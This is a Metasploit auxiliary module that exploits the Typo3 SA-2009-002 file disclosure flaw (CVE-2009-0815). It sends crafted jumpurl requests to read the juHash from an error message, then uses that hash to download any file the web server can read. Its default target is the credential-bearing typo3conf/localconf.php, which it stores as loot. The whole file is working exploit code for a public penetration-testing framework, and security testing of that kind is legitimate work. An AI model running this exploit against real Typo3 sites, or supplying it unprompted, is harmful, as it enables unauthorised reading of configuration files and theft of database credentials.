##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Typo3 sa-2009-002 File Disclosure',
        'Description' => %q{
          This module exploits a file disclosure vulnerability in the jumpUrl mechanism of
          Typo3. This flaw can be used to read any file that the web server user account has
          access to.
        },
        'Author' => [ 'spinbad <spinbad.security[at]googlemail.com>' ],
        'License' => MSF_LICENSE,
        'References' => [
          ['OSVDB', '52048'],
          ['CVE', '2009-0815'],
          ['URL', 'http://web.archive.org/web/20090212165636/http://secunia.com:80/advisories/33829/'],
          ['EDB', '8038'],
          ['URL', 'http://typo3.org/teams/security/security-bulletins/typo3-sa-2009-002/'],
        ],
        'DisclosureDate' => '2009-02-10',
        'Actions' => [
          ['Download', { 'Description' => 'Download arbitrary file' }]
        ],
        'DefaultAction' => 'Download',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('URI', [true, 'Typo3 Path', '/']),
        OptString.new('RFILE', [true, 'The remote file to download', 'typo3conf/localconf.php']),
      ]
    )
  end

  def run
    print_status('Establishing a connection to the target...')

    error_uri = datastore['URI'] + '/index.php?jumpurl=' + datastore['RFILE'] + '&juSecure=1&type=0&locationData=1:'
    ju_hash = nil

    res = send_request_raw({
      'uri' => error_uri,
      'method' => 'GET',
      'headers' =>
      {
        'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
        'Connection' => 'Close'
      }
    }, 25)

    if res && (res.message == 'OK')
      res.body =~ /jumpurl Secure: Calculated juHash, ((\w)+), did not match the submitted juHash./

      if ::Regexp.last_match(1).nil?
        print_error('Error while getting juHash. Maybe the version is already patched...')
        return
      end

      ju_hash = ::Regexp.last_match(1)
      print_status("Getting juHash from error message: #{ju_hash}")

    else
      print_error('No response from the server.')
      return
    end

    file_uri = datastore['URI'] + '/index.php?jumpurl=' + datastore['RFILE'] + "&juSecure=1&type=0&juHash=#{ju_hash}&locationData=1:"
    print_status("Trying to get #{datastore['RFILE']}.")

    file = send_request_raw({
      'uri' => file_uri,
      'method' => 'GET',
      'headers' =>
      {
        'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
        'Connection' => 'Close'
      }
    }, 25)

    if file && file.message == 'OK'
      if file.body == 'jumpurl Secure: "' + datastore['RFILE'] + '" was not a valid file!'
        print_error("File #{datastore['RFILE']} does not exist.")
        return
      end

      fname = File.basename(datastore['RFILE'].downcase)
      print_good("Writing file #{fname} to loot")
      store_path = store_loot(
        'typo3_' + fname,
        'application/octet-stream',
        Rex::Socket.getaddress(rhost),
        file.body,
        'typo3_' + fname,
        'Typo3_sa_2009_002'
      )
      print_good("File successfully retrieved and saved: #{store_path}")
    else
      print_error('Error while getting file.')
    end
  end
end
